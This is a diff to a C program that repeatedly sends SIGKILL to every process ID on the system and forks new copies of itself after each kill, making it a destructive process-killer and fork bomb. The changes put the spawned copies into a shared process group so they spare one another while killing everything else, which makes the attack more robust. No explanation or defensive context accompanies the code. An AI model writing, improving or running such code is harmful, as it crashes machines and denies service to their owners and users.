@@ -15,53 +15,45 @@
 
 void attack();
 void spawn();
-char* getExe(int pid);
-char* exenm;
 
 char* self;
+pid_t pgid;
 
 int main(int argc, char* argv[]) {
 
 	self = strdup(argv[0]);
+	
+	if (argc != 2) { pgid = getpid(); }
+	else           { pgid = atoi(argv[1]); }
 
-	//exenm = getExe(getpid());
-	
-	
-	while(1){
-		//spawn();
-		attack();
+	if (argc > 1 && pgid == 0) {
+		printf("args : %s, %s\n", argv[0], argv[1]);
 	}
+
+	if (setpgid(0, pgid)) {
+		printf("setpgid() failed!\n");
+	} 
+	else {
+		//printf("%d -> %d\n", getpid(), pgid);
+	}
+
+	while(1){ attack(); }
 }
 void attack(){
 	int p = getpid();
-	int i = 1;
-	while(i < 32767){
-		if(i != p){
-			kill(i, SIGKILL);
-			spawn();
-		}
-		i++;
+	for (int i = 1; i < 32768; i++) {
+		if (i == p) continue;
+		if (getpgid(i) == pgid) continue;
+		kill(i, SIGKILL);
+		spawn();
 	}
 }
 void spawn() {
 	int p = fork();
 	if (p == 0) {
-		execl(self, self, NULL);
+		char buffer[32];
+		sprintf(buffer, "%d", pgid);
+
+		execl(self, self, buffer, NULL);
 	}
 }
-
-char* getExe(int pid){
-	char* exe = new char[1024];
-	char path[1024];
-
-	sprintf(path, "/proc/%d/exe", pid);
-
-	int ret = readlink(path, exe, 1023);
-	if(ret == -1){
-		return NULL;
-	}
-	exe[ret] = 0;
-	return exe;
-}
-
-
